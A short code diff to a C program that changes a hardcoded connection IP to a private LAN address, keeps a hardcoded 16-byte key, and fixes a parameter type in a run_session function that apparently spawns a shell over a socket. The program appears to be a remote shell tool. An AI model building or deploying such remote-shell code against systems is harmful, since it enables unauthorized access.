@@ -14,7 +14,7 @@
 
 #define BUFFER 1024
 #define PORT 3000
-#define IP "127.0.0.1"
+#define IP "192.168.0.24"
 
 
 unsigned char key[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
@@ -91,7 +91,7 @@ int send_packet(int s, unsigned char buff[], int len){
     return 0;
 }
 
-void run_session(sock){
+void run_session(int sock){
 
     int master;
     pid_t shell_pid;
